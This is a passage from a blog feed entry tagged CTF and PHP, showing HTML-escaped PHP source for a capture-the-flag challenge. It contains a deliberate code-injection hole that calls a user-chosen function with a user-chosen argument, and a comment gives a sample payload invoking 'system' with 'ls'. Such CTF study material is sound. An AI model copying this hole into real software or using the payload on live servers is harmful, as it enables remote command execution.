&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echofail(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// CodeInjection, may cause RCE, e.g.,&amp;#123;&quot;f&quot;:&quot;system&quot;,&quot;d&quot;:&quot;ls&quot;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $d[&lt;span class=&quot;string&quot;&gt;&#39;f&#39;&lt;/span&gt;]($d[&lt;span class=&quot;string&quot;&gt;&#39;d&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;gencodeurl&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($a)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $e = md5(date(&lt;span class=&quot;string&quot;&gt;&quot;Y-m-d&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (strlen($a) &amp;gt; &lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $f = substr($a, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $g = substr($a, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $f = &lt;span class=&quot;string&quot;&gt;&#39;good&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $g = &lt;span class=&quot;string&quot;&gt;&#39;web.com&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $b = &lt;span class=&quot;string&quot;&gt;&#39;http://&#39;&lt;/span&gt;.$f.$g; &lt;span class=&quot;comment&quot;&gt;// url=http://pass[30:35]+pass[10:20], i.e.,url&amp;lt;=15&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; $b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;echofail&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($h)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;span class=&quot;comment&quot;&gt;/*...*/&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;echologin&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;span class=&quot;comment&quot;&gt;/*...*/&lt;/span&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://anemone.top/categories/CTF/"/>
    
    
      <category term="PHP" scheme="http://anemone.top/tags/PHP/"/>
    
      <category term="CTF" scheme="http://anemone.top/tags/CTF/"/>
    
  </entry>
  
</feed>
